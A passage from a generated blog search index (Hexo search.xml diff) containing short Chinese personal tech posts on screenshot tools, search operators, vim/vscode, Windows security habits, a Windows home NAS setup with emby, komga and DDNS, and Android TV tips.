+            <tag> 网络 </tag>
+            
+            <tag> 路由器 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>截图工具功能简评</title>
+      <link href="/2024/02/03/%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E5%8A%9F%E8%83%BD%E7%AE%80%E8%AF%84/"/>
+      <url>/2024/02/03/%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E5%8A%9F%E8%83%BD%E7%AE%80%E8%AF%84/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于截图工具"><a href="#关于截图工具" class="headerlink" title="关于截图工具"></a>关于截图工具</h1><p>如果只是日用的话,pixpin足矣,写博客对图片的需求稍微提高了,所以对相关截图工具的功能进行了一些测试</p><p>本文按照核心的功能来讲述</p><h1 id="截图后的编辑和再编辑"><a href="#截图后的编辑和再编辑" class="headerlink" title="截图后的编辑和再编辑"></a>截图后的编辑和再编辑</h1><p>这一点上faststone capture一骑绝尘,可以保存为fsc特有的格式,进行再次编辑,非常方便</p><p>其余截图工具只是将图片存为标准格式罢了,这个功能对写博客来说非常重要,比如制作了一张讲解图片,后来发现其中一个文字写错了,总不能重新制作吧?如果保存了fsc的自有格式的话只需重新打开修改一个字可以了,这种小需求无需要图层就能解决</p><h1 id="贴图"><a href="#贴图" class="headerlink" title="贴图"></a>贴图</h1><p>这是fsc的一大痛点,至今不支持贴图,虽然可以自己脚本实现,但是终究是落了下乘,我对这个功能需求暂时不高,后续深入研究,目前来看,pixpin的贴图就是完全够用的</p><h1 id="ocr"><a href="#ocr" class="headerlink" title="ocr"></a>ocr</h1><p>这个pixpin独领风骚了,体验相当优秀</p><h1 id="长截图"><a href="#长截图" class="headerlink" title="长截图"></a>长截图</h1><p>用的较少,pixpin也是支持的</p><h1 id="gif和视频录制"><a href="#gif和视频录制" class="headerlink" title="gif和视频录制"></a>gif和视频录制</h1><p>pixpin的gif录制效果不错,后续如果能支持视频录制的话基本上功能上可以覆盖所有需求了</p><h1 id="自定义截图"><a href="#自定义截图" class="headerlink" title="自定义截图"></a>自定义截图</h1><p>固定位置,延迟的截图,基本也是都有的功能</p><h1 id="截图后上传"><a href="#截图后上传" class="headerlink" title="截图后上传"></a>截图后上传</h1><p>这个只有sharex有,但是这个完全是可以给更专业的picgo完成的,所以没必要追求</p><h1 id="自动截图"><a href="#自动截图" class="headerlink" title="自动截图"></a>自动截图</h1><p>也可以自己脚本实现的,当然能原生实现更舒服</p><h1 id="拾色器-尺子-小工具"><a href="#拾色器-尺子-小工具" class="headerlink" title="拾色器,尺子 小工具"></a>拾色器,尺子 小工具</h1><p>尺子pixpin暂时还没有,慢慢加上吧,虽然不是刚需工具</p><h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>打住,这已经逐渐脱离截图工具的功能, 这些虽然sharex都有,但我觉得这些杂七杂八的功能已经有点偏离了截图工具的功能了</p><h1 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h1><p>pixpin的支持比较完全,主要是可以实现一些自定义组合的截图功能所使用</p><h1 id="我心目中比较好的组合"><a href="#我心目中比较好的组合" class="headerlink" title="我心目中比较好的组合"></a>我心目中比较好的组合</h1><p>pixpin必装,fsc辅助,另外装一个录屏工具,这个后续评测</p><p>上传的话统一用picgo</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>搜索引擎语法速查表</title>
+      <link href="/2024/02/03/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
+      <url>/2024/02/03/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
+      
+        <content type="html"><![CDATA[<table><thead><tr><th>指令</th><th>用法</th><th>示例</th></tr></thead><tbody><tr><td>“”(引号)</td><td>用引号来查询一个确切的单词或短语</td><td>查找有关《百年孤独》这本书的网页，语法：”百年孤独”</td></tr><tr><td>OR(或者)</td><td>用OR分隔搜索词，同时执行两个搜索查询，这将找到包含多个单词之一的页面。</td><td>搜索引用了“Google Drive”、“Dropbox”或“OneDrive”的页面，语法：Google Drive OR Dropbox OR OneDrive</td></tr><tr><td>-(减号、连字符)</td><td>在单词或网站前使用连字符将其从搜索结果中排除</td><td>从搜索结果中排除维基百科页面，语法：- site:<a href="http://wikipedia.org/">http://wikipedia.org</a></td></tr><tr><td>allintext:</td><td>使用allintext:[搜索短语]查找正文中包含这些单词的页面</td><td>查找正文中有关Roth、IRA投资讯息的页面，语法：allintext:Roth IRA 投资</td></tr><tr><td>allintitle:</td><td>使用allintitle:[搜索短语]查找标题中包含这些单词的页面</td><td>查找标题中同时包含“Apple”和“notebook”的页面，语法：allintitle:Apple notebook</td></tr><tr><td>allinurl:</td><td>使用allinurl:[搜索短语]查找URL中包含这些单词的页面</td><td>查找URL中同时包含”Microsoft” and “Surface”的页面，语法：allinurl:Microsoft Surface</td></tr><tr><td>site:</td><td>使用site:[URL]将搜索结果限制到特定网站</td><td>查找云点SEO网关于谷歌SEO的页面，语法：site:<a href="http://yundianseo.com/">http://yundianseo.com</a> 谷歌SEO</td></tr><tr><td>~(波浪号)</td><td>使用波浪号获得目标关键词及其近似词的搜索结果</td><td>查找SEO方面的策略或者教程，语法：SEO ~教程</td></tr><tr><td>related:</td><td>使用related:[URL]查找与特定网站类似的网站</td><td>查找与云点SEO类似的网站，语法：related:<a href="http://yundianseo.com/">http://yundianseo.com</a></td></tr><tr><td>define:</td><td>使用define:[搜索短语]查找其定义</td><td>查找SEO的定义，语法：define:SEO</td></tr><tr><td>$</td><td>使用$查找特定价格的商品</td><td>查找一款售价在99美金的手机，语法：mobile phone $99</td></tr><tr><td>location:</td><td>使用location:[地点]查看某个地区内的相关信息</td><td>查询南京的酒店，语法：hotel location:Nanjing</td></tr><tr><td>*（星号）</td><td>添加星号作为未知单词或事实的占位符</td><td>查找以“生活就像一个”开头的引语，语法：生活就像一个*</td></tr><tr><td>filetype:</td><td>使用filetype:[后缀]将结果限制为特定的文件格式，如PDF或DOC。</td><td>查找PDF格式的Microsoft Office键盘快捷键相关文件，语法：filetype:pdf Microsoft Office键盘快捷键</td></tr><tr><td>..（两点）</td><td>用两个句点分隔数字，不带空格，以搜索该范围内的数字</td><td>查找1950年至2000年间发生的计算机里程碑，语法：”计算机里程碑” 1950..2000</td></tr><tr><td>AROUND(n)</td><td>在两个搜索词之间加上AROUND(n)，以查找两个词间有特定距离的页面。用数字n设置术语之间的最大距离，这对于查找两个搜索词之间的关系很有用。</td><td>查找在同一句话或段落中提到Facebook和Microsoft的页面，语法：Facebook AROUND(7) Microsoft</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> 速查 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 搜索 </tag>
+            
+            <tag> 速查 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>为什么代理后ping不通</title>
+      <link href="/2024/02/03/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BB%A3%E7%90%86%E5%90%8Eping%E4%B8%8D%E9%80%9A/"/>
+      <url>/2024/02/03/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BB%A3%E7%90%86%E5%90%8Eping%E4%B8%8D%E9%80%9A/</url>
+      
+        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>代理开着但是仍旧ping不通谷歌,浏览器能上网</p><h1 id="答"><a href="#答" class="headerlink" title="答"></a>答</h1><p>ping走的是icmp协议,本就不走系统代理<br>如果实在想要ping通,要么tun模式,要么传统vpn</p><h1 id="命令行不走系统代理是个错误表述"><a href="#命令行不走系统代理是个错误表述" class="headerlink" title="命令行不走系统代理是个错误表述"></a>命令行不走系统代理是个错误表述</h1><p>win这个cmd本来就是在调用具体的exe,应该说是具体的比如ping.exe不走系统代理而不是cmd不走,这个要弄清</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于vim</title>
+      <link href="/2024/02/01/%E5%85%B3%E4%BA%8Evim/"/>
+      <url>/2024/02/01/%E5%85%B3%E4%BA%8Evim/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么要用vim？"><a href="#为什么要用vim？" class="headerlink" title="为什么要用vim？"></a>为什么要用vim？</h1><p>纯键盘党，vim的模式毕竟顺手吧</p><h1 id="vim的定位"><a href="#vim的定位" class="headerlink" title="vim的定位"></a>vim的定位</h1><p>文本编辑器，而不是ide</p><p>个人只使用vim来编辑文本，和简单的代码审阅，配置的修改，工程项目的开发根据需求使用相应的ide。</p><p>不用纯vim来开发，所以没有配置语法服务器相关的，包括补全，也只配置了最基础的</p><h1 id="nvim有必要吗？"><a href="#nvim有必要吗？" class="headerlink" title="nvim有必要吗？"></a>nvim有必要吗？</h1><p>因为只是当做简单的编辑器所以我对nvim的态度也是：毫无必要。包括对lua配置vim，对我来说并无必要，如果掌握了viml的情况下，再重新研究nvim确实费些功夫，不如省事，反正只是编辑器</p><h1 id="不同的平台使用和配置"><a href="#不同的平台使用和配置" class="headerlink" title="不同的平台使用和配置"></a>不同的平台使用和配置</h1><ol><li>win上使用gvim</li><li>vscode中使用vim插件</li><li>jb家的ide使用ideavim</li><li>linux终端中使用vim</li></ol><h1 id="关于文章"><a href="#关于文章" class="headerlink" title="关于文章"></a>关于文章</h1><p>和vscode一样，不讲细节，我的vim就是便携版的无需保存配置的说明，所以这里只会记录一些我认为毕竟重要的心得和技巧，并且不是那种随便搜就能找到的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vim </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vim </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于vscode</title>
+      <link href="/2024/02/01/%E5%85%B3%E4%BA%8Evscode/"/>
+      <url>/2024/02/01/%E5%85%B3%E4%BA%8Evscode/</url>
+      
+        <content type="html"><![CDATA[<h1 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h1><p>确实一些细节不如jb家的ide，不过开源免费，个人是挺讨厌破解之类的操作的，vscode大部分需求本就是能实现的，何必破解jb使用？</p><p>个人并不是职业开发，所以大部分时候写的都是极小的项目，使用没有配置语法服务器的vim过于简陋，vscode的量级正合适</p><h1 id="vscode和vim"><a href="#vscode和vim" class="headerlink" title="vscode和vim"></a>vscode和vim</h1><p>因为本人放弃了nvim，因而也放弃了vscode上的nvim插件，原理是打开nvim作为后端，拿vscode做nvim的前端，因而能够直接使用大量vim插件，不过bug也是不少的</p><p>所以最终还是回到了最简单的vim插件，也能使用vimrc简单配置</p><h1 id="关于记录"><a href="#关于记录" class="headerlink" title="关于记录"></a>关于记录</h1><p>这里也不会记录具体的配置，毕竟可以直接搜索到，只会记录一些问题</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vscode </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vscode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>win电脑安全</title>
+      <link href="/2024/01/31/win%E7%94%B5%E8%84%91%E5%AE%89%E5%85%A8/"/>
+      <url>/2024/01/31/win%E7%94%B5%E8%84%91%E5%AE%89%E5%85%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h1><p>简单说说个人win电脑的安全问题</p><h1 id="安全软件必要性"><a href="#安全软件必要性" class="headerlink" title="安全软件必要性"></a>安全软件必要性</h1><p>相信看我博文的兄弟，都有一定的基础，可能对360等都有了深刻的认识，360固然有用，但是日常没必要开这个大流氓，口碑不错的火绒我也觉得没有必要，更重要的是个人的习惯</p><h1 id="好的习惯"><a href="#好的习惯" class="headerlink" title="好的习惯"></a>好的习惯</h1><p>虚拟机，沙盒还是需提前准备好的，当然，最好的习惯还是尽量只用开源的工具，不要贪小便宜，下那种xx破解之类的，还有陌生人分享的东西一定要虚拟机或者vt测试一下，有时候是被不知情的人分享了病毒文件给感染</p><p>一般来说，不要乱下xx破解，邮件和群文件不要乱打开的话，裸奔也是完全没有问题的</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>沙盒和虚拟机都写了文章介绍</p><p>vt是个聚合的查毒平台</p><p><a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>我的win服务器nas</title>
+      <link href="/2024/01/31/%E6%88%91%E7%9A%84win%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+      <url>/2024/01/31/%E6%88%91%E7%9A%84win%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么用win"><a href="#为什么用win" class="headerlink" title="为什么用win"></a>为什么用win</h1><ol><li>省钱，nas买个白群起码两三千吧，这个换算成电费够我开好几十年了，虽然win主机的电量消耗大，但是这个差距也很难追上几千的成本</li><li>功能够用，下文将会一一说明为什么win也可以实现百分之九十的nas的功能</li><li>节省折腾时间，相对来说win上的环境我更熟悉，节省了折腾linux的时间，不过这个见仁见智</li></ol><h1 id="本文的目标"><a href="#本文的目标" class="headerlink" title="本文的目标"></a>本文的目标</h1><p>说明win作为nas如何实现正经nas的功能</p><h1 id="影视服务器"><a href="#影视服务器" class="headerlink" title="影视服务器"></a>影视服务器</h1><p>emby</p><a href="/2024/01/25/%E5%AE%B6%E5%BA%AD%E6%9C%AC%E5%9C%B0%E5%BD%B1%E8%A7%86%E6%96%B9%E6%A1%88/" title="家庭本地影视方案">家庭本地影视方案</a><p>效果如图，win端安装服务器，操作一样简单，可以实现，内外网愉快的观看自己的影视收藏，音乐也支持，但我一般也不用这个听音乐</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/emby%E5%BD%B1%E8%A7%86%E5%BA%93.png"></p><p>这是外网访问客户端的效果</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E5%A4%96%E7%BD%91%E5%AE%A2%E6%88%B7%E7%AB%AF.jpg"></p><h1 id="漫画电子书服务器"><a href="#漫画电子书服务器" class="headerlink" title="漫画电子书服务器"></a>漫画电子书服务器</h1><p>使用的是komga,支持图片，pdf文档的在线阅读，手机端也有客户端的支持，同样可以外网访问</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/komga.png"></p><h1 id="内外网的文件共享"><a href="#内外网的文件共享" class="headerlink" title="内外网的文件共享"></a>内外网的文件共享</h1><p>内网使用smb,手机或者电脑用tc访问，观看影视之类的也非常丝滑，smb相对于ftp更多是分享而不是传输文件</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/smb.png"></p><p>外网的假设ftp服务器,可以直接下载硬盘中的数据</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/f6ea60d3e09a442793a56d9e1a59a47.jpg"></p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/533a2bd883170f3fd411745856ff1be.jpg"></p><p>nas中也不过是这几种文件分享的方式，还有http和webdev，win也当然全部都可以，只要有公网ip这些nas和win电脑就是半斤八两</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/http%E5%88%86%E4%BA%AB.png"></p><h1 id="alist挂载网盘"><a href="#alist挂载网盘" class="headerlink" title="alist挂载网盘"></a>alist挂载网盘</h1><p>这个一般是路由器的功能，当然有nas的也可以客串一下这个功能</p><p>就是把百度网盘，阿里云盘挂载到webdev，然后可以选择挂载成本地盘符</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E6%8C%82%E8%BD%BD%E7%BD%91%E7%9B%98.png"></p><h1 id="软路由功能"><a href="#软路由功能" class="headerlink" title="软路由功能"></a>软路由功能</h1><p>这个也是客串，没有花钱买正经软路由的话，nas也可以 客串一下，win电脑自然也是可以的，虚拟机装上op的话，也是可以实现旁路由的功能的，这个暂时不展开说，毕竟无论是nas还是win做这个都不是专业的</p><h1 id="ddns域名动态解析"><a href="#ddns域名动态解析" class="headerlink" title="ddns域名动态解析"></a>ddns域名动态解析</h1><p>这个不算是功能，而是为了实现以上功能而必须有的先决条件</p><p>这个具体的操作方法见我关于如何实现ddns的文章</p><h1 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h1><p>有公网ip的情况下，win可以使用远程桌面连接，无论是手机还是电脑都可以公网连接</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/rd.jpg"></p><h1 id="私人博客，网站"><a href="#私人博客，网站" class="headerlink" title="私人博客，网站"></a>私人博客，网站</h1><p>这个暂时没弄，不细说</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> nas </tag>
+            
+            <tag> 服务器 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>自荐tmd</title>
+      <link href="/2024/01/31/%E8%87%AA%E8%8D%90tmd/"/>
+      <url>/2024/01/31/%E8%87%AA%E8%8D%90tmd/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h1><p>这是我在小众软件上自荐tmd的文章,也发在博客上</p><h1 id="软件名称"><a href="#软件名称" class="headerlink" title="软件名称"></a>软件名称</h1><p>tc command tools 简称tmd</p><h2 id="官网-下载"><a href="#官网-下载" class="headerlink" title="官网&amp;下载"></a>官网&amp;下载</h2><p>github开源主页:</p><p><a href="https://github.com/hzncpa/tmd">https://github.com/hzncpa/tmd</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为total commander文件管理器添加支持中文简拼搜索和预览em和cm命令,根据需求执行与重复执行的工具.</p><h1 id="软件特色"><a href="#软件特色" class="headerlink" title="软件特色"></a>软件特色</h1><ol><li>无需配置拿来就用</li><li>支持中文简拼搜索,多关键词搜索</li><li>支持类似vim的重复执行的功能</li><li>支持自定义样式主题</li><li>支持预览命令,也可以用来查询命令和快捷键</li><li>支持多种方式呼出</li><li>支持复制命令的全部和部分信息,方便编辑</li><li>支持根据正则排除某些命令</li><li>增删命令或其他情况自动索引,无需手动重启</li><li>使用ahk语言开发,支持自己修改源码,对快捷键的支持高</li></ol><h1 id="软件截图"><a href="#软件截图" class="headerlink" title="软件截图"></a>软件截图</h1><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/tmd%E8%AF%B4%E6%98%8E.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ahk </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ahk </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>远程开机方案</title>
+      <link href="/2024/01/31/%E7%94%B5%E8%A7%86%E7%9B%B4%E6%92%AD/"/>
+      <url>/2024/01/31/%E7%94%B5%E8%A7%86%E7%9B%B4%E6%92%AD/</url>
+      
+        <content type="html"><![CDATA[<h1 id="目前使用"><a href="#目前使用" class="headerlink" title="目前使用"></a>目前使用</h1><p><a href="https://github.com/lizongying/my-tv">https://github.com/lizongying/my-tv</a><br>这个项目,切换节目也算丝滑流畅</p><h1 id="工具探索"><a href="#工具探索" class="headerlink" title="工具探索"></a>工具探索</h1><p>github上搜索电视直播项目查找</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 电视 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 电视 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>alist使用</title>
+      <link href="/2024/01/30/alist%E4%BD%BF%E7%94%A8/"/>
+      <url>/2024/01/30/alist%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>这个就是把网盘挂载到本地webdav,可以配合raidrive再把webdav挂载到本地磁盘<br>有用是有用,我个人需求不大,操作和部署相对简单,后期完善这个文章</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> nas </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安卓电视使用</title>
+      <link href="/2024/01/30/%E5%AE%89%E5%8D%93%E7%94%B5%E8%A7%86/"/>
+      <url>/2024/01/30/%E5%AE%89%E5%8D%93%E7%94%B5%E8%A7%86/</url>
+      
+        <content type="html"><![CDATA[<h1 id="安装程序"><a href="#安装程序" class="headerlink" title="安装程序"></a>安装程序</h1><ol><li>adb</li><li>商店工具开的http服务</li></ol><h1 id="直播和影视"><a href="#直播和影视" class="headerlink" title="直播和影视"></a>直播和影视</h1><h2 id="效果说明"><a href="#效果说明" class="headerlink" title="效果说明"></a>效果说明</h2><p>能看电视直播和根据配置好的源看影视,但是一段时间可能失效</p><h2 id="找资源的方法"><a href="#找资源的方法" class="headerlink" title="找资源的方法"></a>找资源的方法</h2><ol><li>在github中搜索tvbox,谷歌也行</li><li>github搜索电视相关</li><li><a href="https://www.znds.com/tv-1236500-1-1.html">https://www.znds.com/tv-1236500-1-1.html</a> 参考</li></ol><h1 id="本地影视服务器"><a href="#本地影视服务器" class="headerlink" title="本地影视服务器"></a>本地影视服务器</h1><p>emby和jf都有客户端可以在电视上使用</p><h1 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h1><ol><li>adb卸载ad相关的包</li><li>软路由dns过滤广告</li><li>恢复出厂,断连外网,清数据</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 电视 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 电视 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>server酱的使用</title>
+      <link href="/2024/01/30/server%E9%85%B1%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+      <url>/2024/01/30/server%E9%85%B1%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>我个人是在我的台式电脑,家用nas上使用作为通知之类需求使用的</p><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p><a href="https://sct.ftqq.com/">https://sct.ftqq.com/</a><br>扫码,绑定微信,测试url推送<br>非常简单,没有花里胡哨的功能</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="远程关机开机提醒"><a href="#远程关机开机提醒" class="headerlink" title="远程关机开机提醒"></a>远程关机开机提醒</h2><h3 id="定时关机"><a href="#定时关机" class="headerlink" title="定时关机"></a>定时关机</h3><p>我的电脑每天1点左右定时关机,关机是执行脚本,加入了推送功能,我看到通知就知道关机成功了</p><h3 id="远程开机"><a href="#远程开机" class="headerlink" title="远程开机"></a>远程开机</h3><p>这个也好理解,开机或者登录后执行脚本完成推送</p><h2 id="一键启动服务器的提醒"><a href="#一键启动服务器的提醒" class="headerlink" title="一键启动服务器的提醒"></a>一键启动服务器的提醒</h2><p>这个和开机差不多,我开机后要一键启动emby,kumga,alist,ddns等多个服务器,脚本启动的时候加上通知也是可以的</p><h1 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h1><p>免费版只有五条通知每天,基本只够看看远程开关机</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> nas </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ddns简易教程</title>
+      <link href="/2024/01/30/ddbs%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"/>
+      <url>/2024/01/30/ddbs%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>动态解析域名为ipv6的ip地址</p><h1 id="工具–ddns-go"><a href="#工具–ddns-go" class="headerlink" title="工具–ddns-go"></a>工具–ddns-go</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li>解压,打开服务端</li><li>web界面填好域名,以及获取ip的方法和更新的时间</li><li>添加这个为服务,后台一直运行即可</li></ol><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>阿里云之类的域名都可以用这个,这个做的算是非常傻瓜和稳定了,日志功能也齐全,比那一堆专门针对阿里云的小项目靠谱多了,算是集大成者,不管用啥域名都看看这个工具,不要乱换工具</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 公网 </tag>
+            
+            <tag> 网络 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>漫画和书籍服务器</title>
+      <link href="/2024/01/29/%E6%BC%AB%E7%94%BB%E5%92%8C%E4%B9%A6%E7%B1%8D%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+      <url>/2024/01/29/%E6%BC%AB%E7%94%BB%E5%92%8C%E4%B9%A6%E7%B1%8D%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h1><p>kumga,对pdf和图片类漫画的支持都很好,可以在线观看<br>相对来说也比较轻量级,emby之类的无法在线看pdf的<br>包括其他几个漫画服务器,大多是对图片的支持比较好,不支持pdf</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 本地化 </tag>
+            
+            <tag> 漫画 </tag>
+            
+            <tag> pdf </tag>
+            
+            <tag> 书籍 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tmm挂削简述</title>
+      <link href="/2024/01/29/tmm%E6%8C%82%E5%89%8A%E7%AE%80%E8%BF%B0/"/>
+      <url>/2024/01/29/tmm%E6%8C%82%E5%89%8A%E7%AE%80%E8%BF%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么要手动挂削"><a href="#为什么要手动挂削" class="headerlink" title="为什么要手动挂削"></a>为什么要手动挂削</h1><p>很多命名不规范的用emby可能刮得不对劲不可控,手动的话可以自行判断,比较可靠</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>群友比较推荐3的版本,之后的版本略有问题</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>申请一个tmdb的api,填入电影,电视剧内使用</p><p>不走系统代理,如果使用有问题的话参照填写hosts的方案和内置代理的方案</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> tmm </tag>
+            
+            <tag> 本地化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>emby服务器搭建</title>
+      <link href="/2024/01/29/emby%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
+      <url>/2024/01/29/emby%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h1><ol><li>下载服务端压缩包,解压,打开server</li><li>按照流程简单设置账户,添加媒体文件夹</li><li>提前挂削好视频,不用emby的挂削</li></ol><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>默认8096端口,和jf冲突,两者同时用的话就改端口号,外网访问的话路由器打开端口映射,或者dmz</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> emby </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>收藏网页</title>
+      <link href="/2024/01/29/%E6%94%B6%E8%97%8F%E7%BD%91%E9%A1%B5/"/>
+      <url>/2024/01/29/%E6%94%B6%E8%97%8F%E7%BD%91%E9%A1%B5/</url>
+      
